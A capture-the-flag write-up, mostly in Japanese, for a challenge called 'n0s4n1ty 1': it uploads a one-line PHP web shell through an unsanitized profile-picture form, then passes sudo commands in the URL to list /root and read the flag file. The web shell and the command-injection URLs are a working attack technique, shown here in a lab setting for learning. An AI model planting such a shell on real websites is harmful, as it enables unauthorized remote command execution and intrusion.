## n0s4n1ty 1

### Description  
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.


要約すると、  
写真をアップロードできるwebサイトに欠陥があるよ。  
**/root**ディレクトリ内に隠されているFlagを探して！！

---
早速、webサイトにアクセスする。  
下のようなwebサイトが開く。

![](./img/aa41cb7b591d-20250318.png)

ファイルを適当に、アップする。  
どうやら、サニタイズをしていない。  
jpeg/pngだけでなく、phpもアップできる。 

test.phpファイルをアップすると、どうやら、uploadsフォルダに置かれたようだ。
> The file test.php has been uploaded Path: uploads/test.php

phpファイルをアップロードできるので、以下のスクリプトをアップロードする。
```php
<?php system($_GET["cmd"]);?>
```

その後、url欄の`upload.php`を消して、`uploads/test.php?cmd=sudo%20-l`に置き換える。

実行結果
```
Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL
```

だいたいのコマンドは実行できそう。
`ls /root` を実行する
`cmd=sudo%20-l`を`cmd=sudo%20ls%20/root`にする

実行結果
```
flag.txt
```

cat して中身を見ればFlagがゲットできそう。

`cmd=sudo%20ls%20/root`を`cmd=sudo%20cat%20/root/flag.txt`

実行後、Flagゲット